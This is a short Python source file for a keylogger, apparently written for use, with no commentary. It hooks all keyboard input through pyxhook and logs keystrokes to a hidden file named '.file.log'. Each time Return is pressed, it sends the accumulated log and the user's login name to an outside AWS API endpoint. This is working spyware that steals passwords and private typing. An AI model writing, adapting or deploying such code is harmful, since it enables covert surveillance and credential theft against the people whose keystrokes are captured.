import os
import pyxhook
import os
import requests

API_URL = "https://sr9jmt1qy9.execute-api.us-west-2.amazonaws.com/Prod/keystrokes"
  
def OnKeyPress(event):
    with open(".file.log", 'a') as f:
        if len(event.Key) == 1:
            f.write(event.Key)
        elif event.Key == "space":
            f.write(" ")
        elif event.Key == "apostrophe":
            f.write("'")
        elif event.Key == "period":
            f.write(".")
        elif event.Key == "exclam":
            f.write("!")
        elif event.Key == "question":
            f.write("?")
        elif event.Key in {"Shift_R", "Shift_L"}:
            pass
        elif event.Key == "Return":
            f.write("\n")
            with open(".file.log", 'r') as read_f:
                events = read_f.readlines()
                x = requests.post(API_URL, data={"": events, "user": os.getlogin()})
        else:
            f.write('\n[{}] '.format(event.Key))

def main():
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()
    try:
        new_hook.start()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))


if __name__ == '__main__':
    main()